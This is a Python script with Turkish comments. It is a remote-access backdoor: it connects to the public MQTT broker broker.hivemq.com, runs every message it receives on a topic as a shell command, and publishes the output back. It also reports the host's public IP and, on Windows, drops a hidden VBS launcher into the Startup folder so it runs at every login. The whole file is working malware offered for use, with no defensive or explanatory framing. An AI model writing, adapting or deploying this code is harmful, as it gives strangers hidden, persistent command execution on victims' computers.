import sys
import subprocess
import re
import urllib.request
import os

# 1. Gerekli kütüphanenin varlığını kontrol et ve otomatik kur
try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("[+] 'paho-mqtt' kütüphanesi bulunamadı, kuruluyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paho-mqtt"])
    import paho.mqtt.client as mqtt

# ================= KULLANICI AYARLARI =================
MQTT_BROKER = "broker.hivemq.com"
MQTT_PORT = 1883
LISTEN_TOPIC = "cihaz/komutlar"
RESPONSE_TOPIC = "cihaz/yanitlar"
# =======================================================

def get_public_ip():
    """Cihazın dış (public/kamusal) IP adresini internet üzerinden sorgular."""
    servisler = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip"
    ]
    
    for servis in servisler:
        try:
            req = urllib.request.Request(servis, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                ip = response.read().decode('utf-8').strip()
                if ip:
                    return ip
        except Exception:
            continue
            
    return "Dış IP alınamadı (İnternet bağlantısı yok veya servisler yanıt vermiyor)."

def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        print(f"[+] MQTT Sunucusuna bağlandı. Konu dinleniyor: {LISTEN_TOPIC}")
        client.subscribe(LISTEN_TOPIC)
    else:
        print(f"[-] Bağlantı başarısız, hata kodu: {rc}")

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        print(f"[-] Mesaj okuma hatası: {e}")
        return

    if not payload:
        return

    print(f"\n[Gelen Mesaj]: {payload}")
    yanit = ""

    # 1. !!IP!! Komutu (Dış/Public IP Döner)
    if payload.upper() == "!!IP!!":
        dis_ip = get_public_ip()
        yanit = f"[Dış IP Bilgisi]: {dis_ip}"

    # 2. !!IP!! Hariç Tüm Gelen Mesajlar Doğrudan CMD Komutu Olarak Çalıştırılır
    else:
        try:
            encoding_type = 'cp857' if sys.platform == 'win32' else 'utf-8'
            cikti = subprocess.check_output(
                payload, 
                shell=True, 
                stderr=subprocess.STDOUT, 
                text=True, 
                encoding=encoding_type,
                errors='replace'
            )
            yanit = f"[CMD Çıktısı - '{payload}']:\n{cikti}"
        except subprocess.CalledProcessError as e:
            yanit = f"[CMD Hatası - '{payload}']:\n{e.output}"
        except Exception as e:
            yanit = f"[Sistem Hatası]: {str(e)}"

    # Yanıt varsa MQTT üzerinden gönder
    if yanit:
        client.publish(RESPONSE_TOPIC, yanit)
        print(f"[Yanıt Gönderildi -> {RESPONSE_TOPIC}]:\n{yanit}")

def add_to_startup():
    try:
        appdata = os.getenv('APPDATA')
        if not appdata:
            return
        startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
        script_path = os.path.abspath(__file__)
        vbs_path = os.path.join(startup_dir, "myscript_launcher.vbs")
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        
        vbs_content = f'Set WshShell = CreateObject("WScript.Shell")\n' \
                      f'WshShell.Run """{pythonw_path}"" ""{script_path}""", 0, False\n'
        
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
    except Exception as e:
        print(f"[-] Startup ekleme hatası: {e}")

# Başlangıca ekle
add_to_startup()

# Client Kurulumu
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.on_message = on_message

print("[+] Sunucuya bağlanılıyor...")
client.connect(MQTT_BROKER, MQTT_PORT, 60)

# Sonsuz döngüde dinlemeye başla
try:
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[-] İstemci kapatıldı.")
    client.disconnect()
